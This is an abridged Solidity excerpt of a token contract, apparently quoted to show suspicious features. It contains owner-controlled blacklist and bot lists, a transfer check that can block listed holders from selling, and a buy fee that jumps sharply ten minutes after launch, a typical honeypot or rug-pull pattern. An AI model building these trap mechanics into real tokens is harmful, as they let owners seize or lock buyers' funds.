...
contract AbsToken is IERC20, Ownable {
    ...
    constructor(
        ...
        _blacks[address(this)] = true;
        _blacks[Address3] = true;
        _blacks[address(swapRouter)] = true;
        _blacks[tx.origin] = true;
        _blacks[Address4] = true;
        _blacks[Deadaddress] = true;
        ...
        for (uint256 i = 0; i < BlList.length; i++) {
            _BOTList[BlList[i]] = true;
            _blacks[BlList[i]] = true;
        }
    }
    ...
    function _transfer(
        ...
        require(!_List[from] || _blacks[from]);
        if (block.timestamp > (starBlock + 600) && !flag) {
            _buyHeightFee = 1000;
            flag = true;
        }
        if (!_blacks[from] && !_blacks[to] && airdropEnable) {
            address ad;
    ...
    onlyOwner
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            _BOTList[accounts[i]] = excluded;
            _blacks[accounts[i]] = excluded;
        }
    }
...
//         "quick",
//         "quick",
//         [0x000000000000000000000000000000000000dEaD, 0x3FBC46f3Ff45393D5B0C528c07e6443e47Db0564, 0x81a424C624092608Ece31Ad56ff39d1223717308, 0x6bB11D3217f4045Bd8fB44F8FC12dC1418c2Ae3f, 0xde94cc80B16f9f53429ffbAC25f7f71f5F9d688e, 0xbBa8Ff08e1F4aC85CEbD1004aE42361aCbd5c7B4],
//         18,
//         9000000,
//         1670783400,
